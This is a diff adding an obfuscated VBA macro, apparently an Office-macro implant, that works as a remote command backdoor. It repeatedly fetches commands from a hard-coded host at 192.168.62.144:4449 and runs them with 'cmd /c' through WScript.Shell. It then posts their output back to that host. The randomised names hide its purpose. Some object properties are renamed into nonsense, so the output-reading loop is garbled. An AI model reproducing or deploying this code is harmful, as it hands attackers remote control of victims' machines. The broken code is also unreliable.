@@ -1,0 +1,33 @@
+Option Explicit
+Dim var_29200 As Object
+Dim var_24655 As Object
+Dim var_97617 As Object
+Dim var_46352 As String
+Dim var_27434 As Boolean
+Dim var_10810 As String
+
+Sub var_48370()
+    Const var_51133 = "http://192.168.62.144:4449/"
+    Set var_24655 = CreateObject("WScript.Shell")
+    var_27434 = False
+
+    Do While var_27434 <> True
+        Set var_29200 = CreateObject("MSXML2.ServerXMLHTTP")
+        var_29200.Open "GET", var_51133, False
+        var_29200.Send
+        var_46352 = "cmd /c " & Trim(var_29200.responseText)
+
+        If InStr(var_46352, "EXIT") Then
+            var_27434 = True
+        Else
+            Set var_97617 = var_24655.Exec(var_46352)
+            var_10810 = ""
+            Do While Not var_97617.var_48441.var_71889
+                var_10810 = var_10810 & var_97617.var_48441.var_67459
+            Loop
+            Set var_29200 = CreateObject("MSXML2.ServerXMLHTTP")
+            var_29200.Open "POST", var_51133, False
+            var_29200.Send (var_10810)
+        End If
+    Loop
+End Sub
